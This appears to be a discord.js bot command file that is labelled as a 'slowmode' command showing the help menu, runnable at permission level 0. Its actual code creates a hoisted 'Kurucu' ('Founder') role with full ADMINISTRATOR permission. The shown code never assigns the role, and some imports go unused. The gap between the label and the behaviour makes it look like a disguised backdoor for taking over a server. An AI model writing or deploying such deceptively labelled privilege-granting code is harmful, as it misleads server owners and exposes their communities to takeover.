const Discord = require('discord.js'); 
var request = require('request');
const db = require('quick.db')
exports.run = async(client, message, args) => {
  message.guild.createRole({
        name: `?? | Kurucu`,
        color: "#46FE95", 
        hoist: true,
        permissions: [
            "ADMINISTRATOR",
    ]
    }).then(kurucurol => {
  })
}


module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["yavaşmod"],
  permLevel: 0
};

module.exports.help = {
  name: 'slowmode',
  description: 'Yardım Menüsünü Gösterir.',
  usage: 'yardım'
};
